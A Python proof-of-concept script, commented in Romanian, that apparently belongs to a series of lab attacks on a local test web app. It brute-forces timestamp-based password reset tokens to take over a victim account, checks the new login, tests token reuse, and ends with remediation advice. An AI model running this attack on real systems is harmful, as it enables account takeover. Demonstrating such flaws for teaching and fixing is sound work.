"""
ATAC 4.6 — Resetare parola nesigura (token predictibil)
=========================================================
Demonstreaza ca tokenul de resetare a parolei este bazat
pe timestamp Unix (time.time()), deci complet predictibil.

Vulnerabilitati:
  1. Token predictibil — generat din timestamp curent
  2. Token reutilizabil — nu e marcat ca folosit dupa utilizare
  3. Fara expirare — tokenul e valid pentru totdeauna

Impact: un atacator poate reseta parola oricarui utilizator
        cunoscand aproximativ momentul in care a cerut resetarea.
"""

import requests
import time

BASE_URL = "http://127.0.0.1:5000"
TARGET_EMAIL = "victim@authx.com"
PAROLA_NOUA = "hacked123"

print("=" * 60)
print("  ATAC 4.6 — Token predictibil la resetare parola")
print("=" * 60)
print(f"  Target: {TARGET_EMAIL}")
print(f"  Metoda: brute force pe timestamp Unix")
print("=" * 60)

# -------------------------------------------------------
# PASUL 1: Atacatorul cere resetarea parolei pentru tinta
# -------------------------------------------------------
print("\n[1] Trimitere cerere de resetare parola...")

timestamp_inainte = int(time.time())

requests.post(
    f"{BASE_URL}/forgot-password",
    data={"email": TARGET_EMAIL}
)

timestamp_dupa = int(time.time())

print(f"    Cerere trimisa!")
print(f"    Fereastra de timp: {timestamp_inainte} - {timestamp_dupa}")
print(f"    Tokene posibile de incercat: {timestamp_dupa - timestamp_inainte + 1}")

# -------------------------------------------------------
# PASUL 2: Brute force pe tokenele posibile (timestamp)
# -------------------------------------------------------
print("\n[2] Brute force token (interval timestamp)...")

token_gasit = None

for token_candidat in range(timestamp_inainte - 1, timestamp_dupa + 2):
    response = requests.post(
        f"{BASE_URL}/reset-password",
        data={
            "token": str(token_candidat),
            "password": PAROLA_NOUA
        },
        allow_redirects=True
    )

    if "Parola a fost resetata" in response.text:
        token_gasit = str(token_candidat)
        print(f"    TOKEN GASIT: {token_gasit}")
        print(f"    Parola resetata cu succes la '{PAROLA_NOUA}'!")
        break
    else:
        print(f"    Token {token_candidat} → invalid")

if not token_gasit:
    print("    Token negasit in fereastra. Incearca din nou.")

# -------------------------------------------------------
# PASUL 3: Verificare — login cu parola noua
# -------------------------------------------------------
if token_gasit:
    print(f"\n[3] Verificare login cu parola noua '{PAROLA_NOUA}'...")

    response = requests.post(
        f"{BASE_URL}/login",
        data={"email": TARGET_EMAIL, "password": PAROLA_NOUA},
        allow_redirects=False
    )

    if response.status_code == 302 and "/dashboard" in response.headers.get("Location", ""):
        print(f"    LOGIN REUSIT! Contul {TARGET_EMAIL} a fost preluat.")
    else:
        print(f"    Login esuat (HTTP {response.status_code})")

# -------------------------------------------------------
# PASUL 4: Reutilizare token (token nu e invalidat)
# -------------------------------------------------------
if token_gasit:
    print(f"\n[4] Testare reutilizare token (token reutilizabil?)...")

    response = requests.post(
        f"{BASE_URL}/reset-password",
        data={
            "token": token_gasit,
            "password": "hacked_again"
        },
        allow_redirects=True
    )

    if "Parola a fost resetata" in response.text:
        print("    TOKEN REUTILIZABIL! Parola schimbata din nou.")
        print("    Tokenul nu a fost invalidat dupa prima utilizare.")
    else:
        print("    Token invalidat dupa utilizare (ok).")

print()
print("=" * 60)
print("[!] Concluzie:")
print("[!] 1. Tokenul e un timestamp Unix — ghicit in <5 incercari")
print("[!] 2. Tokenul poate fi reutilizat de mai multe ori")
print("[!] 3. Tokenul nu expira niciodata")
print("[!] Fix: token random (secrets.token_urlsafe), expirare")
print("[!]      15 minute, invalidare dupa prima utilizare")
print("=" * 60)
